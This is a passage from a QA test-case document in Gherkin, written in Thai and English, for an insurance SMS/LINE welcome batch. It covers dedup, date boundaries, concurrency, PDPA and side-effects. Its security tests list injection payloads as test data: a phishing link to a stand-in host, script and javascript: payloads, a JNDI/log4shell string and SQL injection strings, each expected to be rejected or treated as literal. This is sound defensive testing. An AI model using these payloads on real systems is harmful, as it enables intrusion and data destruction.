    Then กรมธรรม์นั้น "<expected>"

    Examples:
      | issue_date | run_date   | year | expected            |
      | 2025-12-31 | 2026-01-01 | 2025 | ไม่ปรากฏ            |
      | 2026-01-01 | 2026-01-02 | 2026 | ปรากฏในกลุ่มเป้าหมาย |
```

```gherkin
# Covers: FR-009, EC-002, A-007
Feature: TC-046 Dedup Tie-break
  Scenario: issue_date เท่ากันทุกฉบับ → tie-break ด้วย MIN(policy_no) แบบ deterministic
    Given ลูกค้า fname="สมหญิง" lname="รักดี" mobile_no="0899000111" มีกรมธรรม์เข้าเงื่อนไข 2 ฉบับ
      | policy_no | policy_type | issue_date |
      | 4220003   | PA          | 2026-05-13 |
      | 2445907   | ORD         | 2026-05-13 |
    When batch ตัดรายการซ้ำ
    Then มี 1 Transaction เท่านั้น
    And Transaction นั้นอ้างอิง policy_no = "2445907" (ค่าที่น้อยที่สุด)
    And การรัน batch ซ้ำด้วยข้อมูลชุดเดิมให้ผลลัพธ์เดิมทุกครั้ง (deterministic)
```

```gherkin
# Covers: FR-012, SC-005
Feature: TC-047 Campaign Link Date Boundary
  Scenario Outline: begin_date/expire_date = วันประมวลผลพอดี → <expected>
    Given วันประมวลผลคือ "2026-05-14"
    And cf_catalog row LINE_LINK/CSMS_SNC_NewCust มี begin_date = "<begin_date>", expire_date = "<expire_date>", active_flag = "Y"
    When batch หาลิงก์แคมเปญที่ active
    Then ระบบ "<expected>"

    Examples:
      | begin_date | expire_date | expected                                   |
      | 2026-05-14 | 2026-05-20  | พบลิงก์ (begin_date inclusive) → ส่งได้     |
      | 2026-05-01 | 2026-05-14  | พบลิงก์ (expire_date inclusive) → ส่งได้    |
      | 2026-05-15 | 2026-05-20  | ไม่พบลิงก์ → หยุดรอบ + email (FR-012a)     |
      | 2026-05-01 | 2026-05-13  | ไม่พบลิงก์ → หยุดรอบ + email (FR-012a)     |
    # ⚠ spec ระบุเพียง "ตรวจช่วงเวลา begin_date/expire_date" ไม่ระบุ inclusive/exclusive ชัดเจน
    #   → ค่าคาดหวัง inclusive เป็นการอนุมาน; หากกำกวมให้ route ไป /speckit-checklist
```

```gherkin
# Covers: FR-012, FR-011
Feature: TC-048 Unicode Customer Name
  Scenario Outline: ชื่อลูกค้า "<fname>" (<label>) → render ข้อความถูกต้อง
    Given ลูกค้ามี fname = "<fname>" ใน ili_customer_data_analytics
    And ลูกค้ารายนั้นเข้าเงื่อนไขส่ง SMS ครบทุกข้อ
    When batch แทนค่า $(var1) และสร้างข้อความ
    Then ข้อความที่ได้มีชื่อ "<fname>" ครบถ้วนไม่ถูกตัด ไม่กลายเป็น "?" หรือ mojibake
    And credit_amount ถูกคำนวณจากความยาวจริงหลัง render
    And ข้อความยังคงมีลิงก์แคมเปญที่ถูกต้องต่อท้าย

    Examples:
      | fname             | label                  |
      | สมชาย             | ไทยปกติ (baseline)     |
      | สมชาย😀           | emoji                  |
      | สมชาย ใจดี   | NBSP คั่นกลาง          |
      | مُحَمَّد            | RTL อาหรับ             |
      | ก้ำกึ่ง           | สระ/วรรณยุกต์ซ้อน (combining) |
      | Ｓｏｍｃｈａｉ    | full-width homoglyph   |
      | สมชาย<U+0000>       | null byte แทรก         |
```

```gherkin
# Covers: FR-009, SC-003
Feature: TC-049 Dedup Bypass via Whitespace
  Scenario Outline: ชื่อ/เบอร์ต่างกันด้วย "<variant>" → dedup ยังทำงานหรือไม่
    Given ลูกค้ารายเดียวกันมีกรมธรรม์ 2 ฉบับเข้าเงื่อนไขในรอบเดียวกัน
    And ฉบับที่ 1 มี fname="สมชาย" lname="ใจดี" mobile_no="0845012341"
    And ฉบับที่ 2 มี "<variant>"
    When batch ตัดรายการซ้ำตาม (fname, lname, mobile_no)
    Then ลูกค้ารายนี้ได้รับ SMS เพียง 1 ข้อความ (SC-003 = 0 การส่งซ้ำ)
    And ระบบ normalize ค่าก่อนเปรียบเทียบ (trim + collapse whitespace + NFC)

    Examples:
      | variant                                          |
      | fname="สมชาย " (ช่องว่างท้าย)                    |
      | fname="สมชาย " (NBSP ท้าย)                  |
      | lname=" ใจดี" (ช่องว่างนำ)                       |
      | mobile_no="084-501-2341" (มีขีด)                 |
      | mobile_no=" 0845012341 " (ช่องว่างหุ้ม)          |
      | fname="สมชาย" แบบ NFD (สระแยก) vs NFC            |
    # ⚠ spec ไม่ระบุ normalization rule ของ dedup key — ค่าคาดหวังเป็นการอนุมาน
    #   ถ้าระบบไม่ normalize จะเกิดการส่งซ้ำ ⇒ ละเมิด SC-003 โดยตรง (route ไป /speckit-checklist)
```

```gherkin
# Covers: FR-004
Feature: TC-050 Phone Format Variants
  Scenario Outline: mobile_no = "<mobile_no>" (<label>) → <expected>
    Given กรมธรรม์ ORD เข้าเงื่อนไข FR-002/FR-003 และมี mobile_no = "<mobile_no>"
    When batch ดึงข้อมูลกลุ่มเป้าหมายและส่ง SMS
    Then ระบบ "<expected>"

    Examples:
      | mobile_no      | label              | expected                                      |
      | 0845012341     | 10 หลักปกติ        | ส่งได้ปกติ (baseline)                         |
      | 084-501-2341   | มีขีดคั่น          | [NEEDS CLARIFICATION] normalize หรือ reject?  |
      | 084 501 2341   | มีช่องว่างคั่น     | [NEEDS CLARIFICATION] normalize หรือ reject?  |
      | +66845012341   | รูปแบบสากล         | [NEEDS CLARIFICATION] normalize หรือ reject?  |
      | 084501234      | 9 หลัก (สั้นไป)    | ควร reject/skip + log ไม่ส่ง                  |
      | 08450123412    | 11 หลัก (ยาวไป)    | ควร reject/skip + log ไม่ส่ง                  |
      | 08450ABCDE     | มีตัวอักษร         | ควร reject/skip + log ไม่ส่ง                  |
      | 0245012341     | เบอร์บ้าน (ไม่ใช่มือถือ) | [NEEDS CLARIFICATION] spec ไม่ระบุ       |
    # ⚠ spec FR-004 ระบุเพียง "มีเบอร์โทรศัพท์ติดต่อ" (NOT NULL/ไม่ว่าง) ไม่มี format validation
    #   → เป็น requirement gap; route ไป /speckit-checklist
```

```gherkin
# Covers: FR-016, FR-017, A-011
Feature: TC-051 Message Length Extremes
  Scenario Outline: ความยาวข้อความ <label> → credit_amount + DB column
    Given template + ชื่อลูกค้า + ลิงก์ ทำให้ข้อความสุดท้ายยาว "<length>" ตัวอักษร (UCS-2 ภาษาไทย)
    When batch คำนวณ credit และบันทึกลง WELCOME_NEW_CUST_LINE
    Then credit_amount = "<credits>" ตาม logic เดิมของ CSMS
    And คอลัมน์ sms_message เก็บข้อความได้ครบไม่ถูก truncate (หรือ error ชัดเจนถ้าเกิน)

    Examples:
      | length | label                    | credits              |
      | 70     | 1 credit พอดี (UCS-2)    | 1                    |
      | 71     | เกิน 1 credit            | 2                    |
      | 140    | template ปัจจุบัน (A-011) | 2                    |
      | 134    | 2 credits พอดี (UCS-2 multipart) | 2            |
      | 135    | เกิน 2 credits           | 3                    |
      | 500    | ชื่อลูกค้ายาวผิดปกติ     | [NEEDS CLARIFICATION] ไม่มี character limit ใน spec |
    # ⚠ A-011: "requirement ไม่จำกัด character limit ของข้อความ" — ไม่มีเพดาน ⇒ ไม่มีเกณฑ์ reject
```

```gherkin
# Covers: FR-020a, FR-019
Feature: TC-052 Manual Fix Range Extremes
  Scenario Outline: ช่วงวันที่ "<start>" ถึง "<end>" (<label>)
    Given วันปัจจุบันคือ "2026-05-17"
    When IT Admin สั่ง Manual Batch ด้วยช่วงวันที่นั้น
    Then ระบบ "<expected>"

    Examples:
      | start      | end        | label                   | expected                                        |
      | 2026-05-15 | 2026-05-15 | 1 วัน                   | ประมวลผล 1 รอบ (issue_date=2026-05-14)          |
      | 2026-05-01 | 2026-05-17 | 17 วัน                  | ประมวลผลครบทุกวันในช่วง                         |
      | 2026-01-01 | 2026-05-17 | ~137 วัน                | [NEEDS CLARIFICATION] ไม่มีเพดานช่วงวันที่ใน spec |
      | 9999-01-01 | 9999-01-02 | ปีไกล                   | ต้อง reject (เกินวันปัจจุบัน — FR-019)          |
      | 2025-12-30 | 2025-12-31 | ก่อน Go-live 2026       | ประมวลผลได้แต่ไม่พบข้อมูล (FR-003 กรอง) → 0 รายการ |
```

```gherkin
# Covers: FR-001, FR-018, FR-021
Feature: TC-053 Empty Round
  Scenario: รอบที่ไม่มีกรมธรรม์เข้าเงื่อนไขเลย → รอบจบปกติ ไม่ส่ง email
    Given วันประมวลผลคือ "2026-05-14"
    And ไม่มีกรมธรรม์ ORD/IND/PA ใดที่ issue_date = "2026-05-13" และสถานะ Inforce
    When batch รันรอบนั้น
    Then batch จบการทำงานด้วยสถานะสำเร็จ
    And ไม่มี SMS ถูกส่ง (0 ราย)
    And ระบบ MUST NOT ส่ง email แจ้งเตือน (0 รายการ ≠ ความล้มเหลวระดับรอบ)
    And รายงาน FR-021 ของวันนั้นแสดงยอด 0 ทุกช่อง (empty state) ไม่ error
```

```gherkin
# Covers: FR-006, A-002
Feature: TC-054 Line Connect Batch Lookup Volume
  Scenario Outline: เรียก Line Connect ด้วย list cardNo จำนวน <count> ราย
    Given รอบประมวลผลมีลูกค้าที่ต้องตรวจสถานะ "<count>" ราย
    When batch เรียก Line Connect Inquiry แบบ list cardNo
    Then ระบบได้รับผลตอบกลับครบทุก cardNo หรือ chunk คำขอตามข้อจำกัดของบริการ
    And ไม่มีรายการใดสูญหายจากการ chunk
    And หากบริการตอบ rate limit (HTTP 429) ระบบจัดการตาม FR-008b (retry/หยุดรอบ) ไม่ใช่ skip เงียบ

    Examples:
      | count  |
      | 1      |
      | 100    |
      | 1000   |
      | 10000  |
    # ⚠ F-005 (checklist G4): spec ไม่ระบุ volume ต่อรอบ และ A-002 เป็นเพียงสมมติฐานว่า "รองรับ batch"
    #   ไม่มีเกณฑ์ผ่าน/ตกด้าน performance — assert ได้เฉพาะความครบถ้วนของข้อมูล
```

---

### Dimension 4 — Concurrency

```gherkin
# Covers: FR-001, FR-020, SC-003
Feature: TC-055 Daily Batch + Manual Fix Concurrent
  Scenario: daily batch และ Manual Fix ช่วงเดียวกันรันพร้อมกัน → ลูกค้าไม่ได้รับซ้ำ
    Given วันประมวลผลคือ "2026-05-15" และมีกรมธรรม์เข้าเงื่อนไข 5 รายการ (issue_date = "2026-05-14")
    And daily scheduler เริ่มรันรอบ "2026-05-15" เวลา 10:00:00
    When IT Admin สั่ง Manual Batch ช่วงวันที่ "2026-05-15" ถึง "2026-05-15" ในเวลา 10:00:02 (ขณะรอบ daily ยังทำงานอยู่)
    Then ลูกค้าแต่ละรายได้รับ SMS ไม่เกิน 1 ข้อความ (SC-003 = 0 การส่งซ้ำ)
    And WELCOME_NEW_CUST_LINE มี row ที่ sent_status='S' ไม่เกิน 1 row ต่อ (policy_no, policy_type, fname, lname)
    And ระบบมีกลไกกัน concurrent run (lock / รอคิว / ปฏิเสธรอบที่สอง) อย่างใดอย่างหนึ่งที่ระบุได้
    # ⚠ spec ไม่ระบุกลไก concurrency control ระหว่าง daily และ Manual Fix — ค่าคาดหวังอนุมานจาก SC-003
```

```gherkin
# Covers: FR-010, BR-005, SC-003
Feature: TC-056 History Check Race Condition
  Scenario: 2 process ตรวจประวัติพร้อมกัน → ต้องมี unique/lock กันส่งซ้ำ
    Given ลูกค้า policy_no="2445901" policy_type="ORD" fname="สมชาย" lname="ใจดี" ยังไม่เคยได้รับ SMS
    And process A และ process B อ่านประวัติจาก WELCOME_NEW_CUST_LINE พร้อมกันในเวลาเดียวกัน (ทั้งคู่เห็น "ยังไม่เคยส่ง")
    When ทั้ง 2 process ดำเนินการส่งและบันทึกผล
    Then มี SMS ถูกส่งจริงเพียง 1 ข้อความ
    And มี row ที่ sent_status='S' เพียง 1 row สำหรับ key นั้น
    And ระบบมี unique constraint หรือ pessimistic/optimistic lock ที่ระดับฐานข้อมูลป้องกัน double-insert
    # ⚠ FR-010 เป็นการ "ตรวจแล้วค่อยเขียน" (check-then-act) โดยไม่มี lock ที่ระบุใน spec/plan
    #   ⇒ ความเสี่ยง TOCTOU ที่ละเมิด SC-003 โดยตรง — ต้องให้ SA/Dev ยืนยันกลไก
```

```gherkin
# Covers: FR-001
Feature: TC-057 Round Overlap Prevention
  Scenario: รอบก่อนหน้ายังไม่จบเมื่อถึง 10:00 ของรอบถัดไป
    Given รอบวันที่ "2026-05-14" ยังทำงานไม่เสร็จ (เช่น ปริมาณสูง / SMS Gateway ช้า — ดู F-005)
    When นาฬิกาเดินถึง 10:00:00 ของวันที่ "2026-05-15" และ scheduler ทริกรอบใหม่
    Then ระบบ MUST NOT รัน 2 รอบทับซ้อนกันจนเกิดการส่งซ้ำ
    And ระบบเลือกอย่างใดอย่างหนึ่งที่ระบุได้: ข้ามรอบใหม่ + log / เข้าคิวรอ / ปฏิเสธพร้อมแจ้งเตือน
    And ลูกค้าไม่ได้รับ SMS ซ้ำจากการทับซ้อนของรอบ
    # ⚠ spec/plan ไม่ระบุ overlap policy ของ Camel scheduler — ต้องให้ SA/Dev ยืนยัน
```

```gherkin
# Covers: FR-019, FR-020
Feature: TC-058 Concurrent Manual Fix by Two Admins
  Scenario: IT_ADMIN 2 คนกด Manual Batch ช่วงวันที่เดียวกันพร้อมกัน
    Given IT Admin "admin1" และ "admin2" เปิดหน้า Manual Fix พร้อมกัน
    And ทั้งคู่เลือก batch "BATCH-CSMS-WELCOME-LINE" ช่วงวันที่ "2026-05-15" ถึง "2026-05-15"
    When ทั้งคู่กด Manual Batch ในเวลาไล่เลี่ยกัน (< 1 วินาที)
    Then มีการประมวลผลเกิดขึ้นเพียงรอบเดียว หรือรอบที่สองถูกปฏิเสธพร้อมข้อความที่เข้าใจได้
    And ลูกค้าแต่ละรายได้รับ SMS ไม่เกิน 1 ข้อความ
    And log ระบุได้ว่าใครเป็นผู้ทริกรอบที่ทำงานจริง
```

---

### Dimension 5 — Security

> **Constitution / PDPA Gate (§7)**: batch นี้จัดการ **card_no (เลขบัตรประชาชน)** และ **mobile_no** — `checklist.md` CHK026 บันทึกว่า **"ไม่มี security/PII NFR เลย"** (Gap G2) และ `plan.md` **ยกเว้น** Constitution Principle IV (Audit Trail — ห้าม log PII) โดยอ้าง legacy pattern **โดยไม่มี compensating control** ⇒ ทุกข้อกังวลด้าน PDPA ยังคงถูกออกแบบ TC ไว้ **ครบทุกข้อ** และ surface เป็น **CRITICAL findings F-002 / F-003** — ห้าม skip เงียบตาม §7

```gherkin
# Covers: FR-012, Constitution II (Secure SMS Delivery)
Feature: TC-059 No PII in SMS Body
  Scenario Outline: ข้อความ SMS MUST NOT มี "<forbidden>"
    Given ลูกค้า card_no="1409900111222" policy_no="2445901" เข้าเงื่อนไขส่ง SMS
    When batch สร้างข้อความ SMS และส่ง
    Then ข้อความที่ส่งจริง MUST NOT มี "<forbidden>" ปรากฏอยู่
    And ข้อความมีเพียงชื่อลูกค้า ($(var1)) + ลิงก์แคมเปญ ($(var2)) + เบอร์ Call Center 1503

    Examples:
      | forbidden                  |
      | card_no (1409900111222)    |
      | policy_no (2445901)        |
      | credit_amount / จำนวนเงิน  |
      | issue_date เต็มรูปแบบ      |
      | mobile_no ในเนื้อความ      |
```

```gherkin
# Covers: FR-015, FR-016, Constitution IV (Audit Trail), PDPA
Feature: TC-060 No Plain PII in Application Logs  @spec_gap
  Scenario Outline: "<pii_field>" MUST NOT ปรากฏแบบ plain ใน "<sink>"
    Given batch ประมวลผลลูกค้า card_no="1409900111222" mobile_no="0845012341" fname="สมชาย"
    When batch รันครบรอบและเขียน log ทุกระดับ (INFO/DEBUG/ERROR)
    Then "<pii_field>" ไม่ปรากฏแบบ plain ใน "<sink>"
    And หากจำเป็นต้องบันทึกเพื่อ trace ต้อง mask (เช่น "14099****222", "084****341")

    Examples:
      | pii_field | sink                                  |
      | card_no   | server.log ของ WildFly                |
      | card_no   | CSMS_LOG.sms_message                  |
      | mobile_no | server.log ของ WildFly                |
      | card_no   | log ของรายการที่ skip (FR-008/008a/011a) |
      | mobile_no | log ของรายการที่ skip                 |
      | card_no   | payload log ของ Line Connect API call |
    # ⚠ F-002 / F-003 — CRITICAL:
    #   (1) checklist CHK026: "ไม่มี NFR ด้าน security/PII เลย" ⇒ ไม่มีเกณฑ์ให้ assert
    #   (2) plan.md ยกเว้น Constitution IV โดยอ้าง legacy pattern แต่ **ไม่มี compensating control**
    #   ⇒ ค่าคาดหวังข้างต้นเป็นข้อเสนอของ QA ตาม constitution ยังไม่ได้รับการรับรองจาก SA/DPO
    #   ⇒ §7 Constitution Gate: **ห้ามประกาศ feature นี้ว่า "verified"** จนกว่าจะมี NFR + คำตัดสิน
```

```gherkin
# Covers: FR-016, Constitution IV, PDPA
Feature: TC-061 PII at Rest — WELCOME_NEW_CUST_LINE  @spec_gap
  Scenario: ตารางเก็บ card_no / mobile_no / fname / lname แบบ plain
    Given ตาราง WELCOME_NEW_CUST_LINE เก็บ card_no, mobile_no, fname, lname เป็น plain text (FR-016)
    When ตรวจสอบมาตรการป้องกันข้อมูลของตารางนี้
    Then ต้องมีการจำกัดสิทธิ์เข้าถึงระดับฐานข้อมูล (GRANT เฉพาะ service account ที่จำเป็น)
    And ต้องมี retention policy ที่ระบุระยะเวลาเก็บและกลไกลบ/anonymize เมื่อหมดอายุ
    And ต้องระบุได้ว่าใครเข้าถึงตารางนี้ได้ และเข้าถึงเมื่อใด (audit)
    # ⚠ F-002 / F-003 — CRITICAL: ไม่มี NFR ใด ๆ รองรับข้อกำหนดข้างต้น (checklist CHK026 / G2)
    #   plan.md ยกเว้น Principle IV โดยอ้าง "เป็น pattern เดียวกับทุก batch CSMS ที่มีอยู่ก่อนแล้ว"
    #   ⇒ การยกเว้นเป็น scope decision ที่บันทึกไว้ แต่ไม่มี compensating control ⇒ ยังเป็น open risk
    #   ⇒ TC นี้ execute ไม่ได้จนกว่าจะมีเกณฑ์ที่ SA/DPO รับรอง
```

```gherkin
# Covers: FR-005, SC-002, PDPA
Feature: TC-062 Do Not Contact Compliance
  Scenario Outline: ลูกค้าใน Do Not Contact ต้องไม่ถูกส่งแม้เข้าเงื่อนไขอื่นครบ
    Given ลูกค้าอยู่ใน Do Not Contact List ("<policy_type>" → remark_code "<remark_code>")
    And ลูกค้ารายนั้นเข้าเงื่อนไขอื่นครบทุกข้อ (T-1, Inforce, มีเบอร์, ไม่มี LINE, ไม่มี Ocean Club, ปี 2026)
    When batch รันรอบนั้น
    Then จำนวน SMS ที่ส่งไปยังลูกค้ารายนั้น = 0 (SC-002)
    And การคัดกรอง Do Not Contact เกิดขึ้น **ก่อน** การเรียก Line Connect Inquiry (ไม่ส่ง card_no ออกนอกระบบโดยไม่จำเป็น)

    Examples:
      | policy_type | remark_code |
      | ORD         | 1           |
      | IND         | 4           |
      | PA          | 4           |
    # ⚠ F-004: opt-out ถูกปิดโดยอ้างเบอร์ 1503 ที่มีในข้อความ แต่ไม่ผูก process กับ Do Not Contact List
    #   ⇒ ลูกค้าที่โทรยกเลิกทาง 1503 ไม่มีกลไกที่ระบุได้ว่าจะเข้า Do Not Contact List เมื่อใด/อย่างไร
```

```gherkin
# Covers: FR-019, Constitution III (RBAC)
Feature: TC-063 RBAC on Manual Fix
  Scenario Outline: ผู้ใช้ role "<role>" เรียก Manual Batch → <expected>
    Given ระบบมีหน้า Manual Fix ของ Admin Dashboard กลาง CSMS
    And batch "BATCH-CSMS-WELCOME-LINE" อยู่ใน list ของหน้านั้น
    When ผู้ใช้ role "<role>" พยายามสั่งรัน Manual Batch ของ batch นี้
    Then ระบบ "<expected>"

    Examples:
      | role                       | expected                                        |
      | IT_ADMIN                   | อนุญาต — เริ่มประมวลผล (FR-019)                 |
      | ผู้ใช้ทั่วไป (business user) | ปฏิเสธ — ไม่เห็นเมนู หรือได้ HTTP 403           |
      | ไม่ได้ login (anonymous)   | ปฏิเสธ — redirect ไปหน้า login / HTTP 401       |
      | IT_ADMIN (session หมดอายุ) | ปฏิเสธ — บังคับ login ใหม่                      |
    And การเรียก endpoint ตรง ๆ (bypass UI ด้วย HTTP POST) ก็ต้องถูกตรวจสิทธิ์เช่นกัน (ไม่ใช่ UI-only guard)
    # หมายเหตุ: plan.md ยกเว้น Principle III เฉพาะเรื่อง "Creator/Approver separation" ของการส่ง
    #   แต่ **ไม่ได้ยกเว้น** การควบคุมสิทธิ์เข้าถึง Manual Fix — TC นี้ยังบังคับใช้เต็มที่
```

```gherkin
# Covers: FR-012, Constitution II
Feature: TC-064 Campaign Link Injection
  Scenario Outline: cf_catalog มีลิงก์ "<link>" (<label>) → <expected>
    Given ตาราง cf_catalog row LINE_LINK/CSMS_SNC_NewCust มีค่าลิงก์ = "<link>" และ active_flag='Y'
    When batch แทนค่า $(var2) และสร้างข้อความ SMS
    Then ระบบ "<expected>"

    Examples:
      | link                                  | label                | expected                                          |
      | https://lin.ee/xd7mW2g                | ลิงก์ปกติ            | ส่งได้ (baseline)                                 |
      | https://evil.example.com/phish        | โดเมนนอก whitelist   | ควรปฏิเสธ + หยุดรอบ + alert (ไม่ส่งลิงก์ปลอมให้ลูกค้า) |
      | javascript:alert(1)                   | scheme อันตราย       | ควรปฏิเสธ — ไม่ส่ง                                |
      | <script>alert(1)</script>             | HTML/script payload  | treat เป็น literal — ไม่ execute ที่ sink ใดเลย   |
      | https://lin.ee/x' OR '1'='1           | SQL metachar ในลิงก์ | treat เป็น literal — ไม่มี SQL injection          |
      | (ยาว 2000 ตัวอักษร)                   | ลิงก์ยาวผิดปกติ      | credit_amount พุ่ง — ควรมีเพดาน                   |
    # ⚠ spec ไม่มี validation/whitelist ของค่าลิงก์จาก cf_catalog เลย (FR-012 เพียงตรวจ active/ช่วงเวลา)
    #   ⇒ ผู้ที่แก้ config ได้ = ผู้ที่ส่งลิงก์อะไรก็ได้ถึงลูกค้าทุกราย — ความเสี่ยงระดับ Critical
    #   ค่าคาดหวังข้างต้นเป็นข้อเสนอของ QA; ต้องให้ SA ยืนยัน (route: /speckit-checklist)
```

```gherkin
# Covers: FR-011, FR-012
Feature: TC-065 Template Injection
  Scenario Outline: template มี "<payload>" (<label>) → <expected>
    Given sms_message_schedule มี template ที่มี "<payload>"
    When batch สร้างข้อความ SMS
    Then ระบบ "<expected>"

    Examples:
      | payload                    | label                    | expected                                    |
      | $(var3)                    | placeholder ที่ไม่รู้จัก | ไม่ throw exception — ต้องไม่ส่งข้อความที่มี "$(var3)" ดิบไปหาลูกค้า |
      | $(var1)$(var1)$(var1)      | ตัวแปรซ้ำ                | แทนค่าครบทุกตำแหน่ง                         |
      | ${jndi:ldap://x/a}         | JNDI lookup payload      | treat เป็น literal — ไม่ resolve (log4shell class) |
      | %s %n                      | format string            | treat เป็น literal — ไม่ format             |
      | '; DROP TABLE CSMS_LOG;--  | SQL metachar             | treat เป็น literal — parameterized insert   |
      | (template ว่าง)            | empty                    | ต้องไม่ส่ง SMS ว่าง — ดู TC-043 (F-008)     |
```

```gherkin
# Covers: FR-006, PDPA (data minimization / in transit)
Feature: TC-066 PII in Transit to External API  @spec_gap
  Scenario: ส่ง card_no ออกไป Line Connect API ภายนอก
    Given batch ต้องเรียก Line Connect Inquiry ด้วย Input: cardNo (list), channels, types
    When batch เรียกบริการภายนอกนั้น
    Then การเชื่อมต่อต้องเป็น TLS (HTTPS) ไม่ใช่ plain HTTP
    And ส่งเฉพาะ field ที่จำเป็น (cardNo, channels, types) — MUST NOT แนบ mobile_no / fname / lname / policy_no
    And request/response payload ที่มี cardNo ต้องไม่ถูก log แบบ plain (ดู TC-060)
    And ต้องมีการยืนยัน certificate ของปลายทาง (ไม่ปิด verification)
    # ⚠ F-002 — CRITICAL: ไม่มี security NFR ใดระบุ TLS / data minimization / cert verification
    #   ⇒ ค่าคาดหวังอ้างจาก Constitution + PDPA ไม่ใช่จาก spec — ต้องเพิ่ม NFR ก่อน SIT
```

```gherkin
# Covers: FR-002, FR-005, FR-009, FR-016
Feature: TC-067 SQL Injection / Metacharacter as Literal
  Scenario Outline: ค่า "<value>" ใน field "<field>" (<label>) → <expected>
    Given ข้อมูลต้นทางมี "<field>" = "<value>" (มาจาก ili_* ซึ่ง batch ไม่ได้ควบคุมคุณภาพ)
    When batch query / dedup / insert ด้วยค่านั้น
    Then ระบบ "<expected>"
    And ไม่มีตารางใดถูก drop/แก้ไข และไม่มี SQL error หลุดออกมาเป็น stack trace

    Examples:
      | field   | value                     | label                | expected                                        |
      | fname   | '; DROP TABLE CSMS_LOG;-- | SQL injection        | parameterized — เก็บเป็น literal, ไม่ execute   |
      | lname   | ' OR '1'='1               | tautology injection  | parameterized — ไม่ทำให้ dedup จับคู่ผิด        |
      | fname   | 100%                      | LIKE wildcard `%`    | treat เป็น literal — dedup ไม่จับคู่กับชื่ออื่น |
      | lname   | a_b                       | LIKE wildcard `_`    | treat เป็น literal — ไม่ match "aXb"            |
      | card_no | 1' UNION SELECT null--    | union injection      | parameterized — ไม่รั่วข้อมูลตารางอื่น          |
      | fname   | สมชาย\x00ปลอม            | null byte            | reject/sanitize — ไม่ truncate เงียบ            |
    # หมายเหตุ (จาก negative-input-catalog §A): LIKE-wildcard escaping (functional/Minor)
    #   ≠ SQL injection (security/Critical) — parameterized query กัน injection ได้ แต่ไม่กัน wildcard
    #   ⇒ ต้องทดสอบทั้งสองอย่างและ label severity ให้ถูก
```

```gherkin
# Covers: FR-021, PDPA
Feature: TC-068 Daily Report Access Control  @spec_gap
  Scenario Outline: ผู้ใช้ role "<role>" เรียกดูรายงานที่มี PII → <expected>
    Given รายงาน "การส่ง SMS Welcome New Customer (LINE)" ดึงข้อมูลจาก WELCOME_NEW_CUST_LINE
    When ผู้ใช้ role "<role>" เรียกดูรายงาน
    Then ระบบ "<expected>"

    Examples:
      | role                       | expected                                          |
      | ผู้ใช้ฝ่ายธุรกิจ (authorized) | เห็นรายงานสรุปยอด (aggregate) ตาม FR-021          |
      | IT_ADMIN                   | เห็นรายงาน                                        |
      | ผู้ใช้ที่ไม่ได้รับสิทธิ์     | ปฏิเสธ (HTTP 403)                                 |
      | ไม่ได้ login               | ปฏิเสธ (HTTP 401 / redirect login)                |
    And หากรายงานแสดงระดับรายการ (drill-down) ต้อง mask mobile_no / card_no หรือจำกัดเฉพาะ role ที่มีสิทธิ์
    # ⚠ F-002: FR-021 ระบุเฉพาะ "ยอดสรุป + breakdown" ไม่ระบุระดับ drill-down หรือสิทธิ์เข้าถึง
    #   ⇒ ไม่มีเกณฑ์ให้ assert — ต้องให้ SA ระบุขอบเขตข้อมูลและสิทธิ์ของรายงานก่อน execute
```

---

### Dimension 6 — Side-Effects

```gherkin
# Covers: FR-008, SC-006
Feature: TC-069 Skip Isolation
  Scenario: skip 1 รายการ ไม่กระทบรายการที่ส่งไปแล้วในรอบเดียวกัน
    Given รอบประมวลผลมี 5 รายการ และรายการที่ 1-2 ถูกส่งสำเร็จไปแล้ว
    When รายการที่ 3 ถูก skip เพราะ E13 (FR-008)
    Then รายการที่ 1-2 ยังคงมี sent_status='S' และ sms_sent_date ไม่ถูกล้างหรือ rollback
    And ไม่มี transaction rollback ที่ย้อนผลของรายการที่ส่งไปแล้ว
    And รายการที่ 4-5 ถูกประมวลผลต่อจนจบ (SC-006 = 100%)
    And ข้อมูลใน CSMS_LOG ของรายการที่ 1-2 ยังอยู่ครบ
```

```gherkin
# Covers: FR-008b, FR-012a, FR-018
Feature: TC-070 Round Abort — No Orphan Records
  Scenario Outline: หยุดรอบกลางคันด้วยเหตุ "<reason>" → ข้อมูลที่ทำไปแล้วต้องครบ ไม่มี orphan
    Given รอบประมวลผลมี 10 รายการ และรายการที่ 1-4 ถูกส่ง SMS สำเร็จไปแล้ว
    When เกิดเหตุ "<reason>" ที่ทำให้ต้องหยุดรอบ
    Then รายการที่ 1-4 มีบันทึกครบทั้ง CSMS_LOG และ WELCOME_NEW_CUST_LINE (sent_status='S')
    And ไม่มีรายการใดที่ "ส่ง SMS ออกไปแล้วแต่ไม่มีบันทึก" (orphan send — จะทำให้ FR-010 กันซ้ำไม่ทำงาน)
    And ไม่มีรายการใดที่ "มีบันทึก sent_status='S' แต่ไม่ได้ส่งจริง" (phantom record)
    And รายการที่ 5-10 สามารถซ่อมย้อนหลังผ่าน Manual Fix ได้ครบ (SC-004)

    Examples:
      | reason                              |
      | Line Connect API ล่มทั้งระบบ (FR-008b) |
      | ไม่มีลิงก์แคมเปญ active (FR-012a)   |
      | DB error ระหว่างบันทึก (FR-018)     |
      | ESB/SMS Gateway ล่ม (FR-018)        |
```

```gherkin
# Covers: FR-016a, SC-007
Feature: TC-071 Full Reconciliation
  Scenario: ทุกรายการที่เข้าขั้นตอนส่ง/ถูก skip มีบันทึก → reconcile ได้ 100%
    Given รอบประมวลผลวันที่ "2026-05-14" มีกรมธรรม์เข้าเงื่อนไขเบื้องต้น 20 รายการ
    And 5 รายการถูกตัดออกด้วย Do Not Contact (FR-005)
    And 3 รายการถูกตัดออกเพราะลงทะเบียน LINE แล้ว (FR-006)
    And 2 รายการถูกตัดออกเพราะซ้ำในรอบ (FR-009)
    And 1 รายการถูกตัดออกเพราะเคยส่งแล้ว (FR-010)
    And 2 รายการถูก skip เพราะ E13 (FR-008)
    And 7 รายการส่งสำเร็จ
    When batch จบรอบและผู้ใช้เรียกดูรายงาน FR-021
    Then WELCOME_NEW_CUST_LINE มี row สำหรับ 9 รายการที่เข้าขั้นตอนส่ง/ถูก skip (7 × 'S' + 2 × 'F')
    And รายงานแสดง: ประมวลผลทั้งหมด=20, สำเร็จ=7, ไม่สำเร็จ/skip=2, ตัดออก=11 (แยกตามเหตุผล 5/3/2/1)
    And ผลรวมทุกช่องในรายงาน reconcile กับข้อมูลจริงได้ 100% ไม่มีรายการหาย (SC-007)
```

```gherkin
# Covers: FR-002, FR-005, FR-011, FR-012
Feature: TC-072 Source Tables Read-only
  Scenario Outline: batch MUST NOT แก้ไขข้อมูลใน "<table>"
